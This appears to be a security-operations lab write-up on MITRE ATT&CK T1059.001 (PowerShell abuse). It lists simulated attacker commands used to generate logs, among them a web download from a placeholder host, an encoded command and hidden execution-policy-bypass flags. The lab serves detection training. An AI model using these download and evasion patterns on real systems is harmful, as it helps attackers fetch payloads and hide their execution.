# MITRE ATT&CK — T1059.001  
## Command and Scripting Interpreter (PowerShell)

---

## 1. Overview

**Technique:** T1059 — Command and Scripting Interpreter  
**Sub-technique:** T1059.001 — PowerShell  
**Tactic:** Execution  

PowerShell is a powerful built-in scripting engine in Windows.  
Adversaries abuse it to execute malicious commands, download payloads, perform reconnaissance, and run fileless malware.

SOC teams actively monitor PowerShell activity because it is frequently used in real attacks such as:

- ransomware initial execution  
- fileless malware  
- credential harvesting  
- reverse shells  
- downloading second-stage payloads  

---

## 2. Lab Environment

- Windows Host  
- **Sysmon installed** with XML configuration  
- **PowerShell Script Block Logging enabled (4104)**  
- **Security auditing (4688)**  
- Optional: Splunk SIEM for detections

---

## 3. Simulated Malicious PowerShell Activity

The following commands were executed to generate MITRE-aligned logs.

```powershell
# 1. Enumerate running processes
powershell.exe -command "Get-Process"

# 2. Simulate malicious web download
powershell.exe "(New-Object Net.WebClient).DownloadString('http://example.com')"

# 3. Encoded PowerShell command (obfuscation)
powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAaABlAGwAbABvACIA

# 4. Create file (Sysmon Event ID 11)
powershell.exe "New-Item -Path C:\temp\attack.txt -ItemType File"

# 5. WMI-based process enumeration
powershell.exe -command "Get-WmiObject Win32_Process"

# 6. Suspicious PowerShell execution flags
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Write-Host 'Simulating reverse shell'"
